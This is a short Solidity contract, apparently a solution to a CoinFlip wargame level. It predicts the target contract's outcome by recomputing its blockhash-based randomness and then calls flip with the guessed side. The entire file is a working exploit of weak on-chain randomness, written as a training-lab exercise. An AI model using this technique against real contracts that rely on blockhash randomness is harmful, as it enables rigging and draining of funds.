// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip victim;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        victim = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool result = victim.flip(side);
        console.log("result", result);
    }
}
